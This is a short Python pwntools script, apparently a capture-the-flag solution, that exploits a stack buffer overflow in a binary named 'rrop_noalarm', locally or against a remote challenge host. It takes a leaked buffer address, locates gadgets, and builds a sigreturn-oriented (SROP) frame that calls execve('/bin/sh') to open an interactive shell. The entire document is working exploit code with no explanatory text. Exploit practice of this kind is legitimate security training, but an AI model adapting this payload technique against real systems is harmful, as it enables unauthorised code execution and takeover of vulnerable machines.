#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./rrop_noalarm')
context.log_level = 'INFO'

if not args.REMOTE:
	context.log_file = 'local.log'
	libc = binary.libc
	p = process(binary.path)
else:
	context.log_file = 'remote.log'
	p = remote('rrop.darkarmy.xyz', 7001)

p.recvuntil('Can you change the behaviour of a process, if so then take my Buffer  @')
_ = p.recvuntil(',').split(b',')[0]
buffer_leak = int(_,16)
log.info('buffer_leak: ' + hex(buffer_leak))

mov_eax_0xf = next(binary.search(asm('mov eax, 0xf; ret')))
sys_ret = next(binary.search(asm('syscall; ret')))

frame = SigreturnFrame()
frame.rax = constants.SYS_execve.real
frame.rdi = buffer_leak
frame.rsi = 0
frame.rdx = 0
frame.rip = sys_ret

payload  = b'/bin/sh\0'
payload += (0xd8 - len(payload)) * b'A'
payload += p64(mov_eax_0xf)
payload += p64(sys_ret)
payload += bytes(frame)

p.sendlineafter('from some part of my process.\n',payload)
p.interactive()
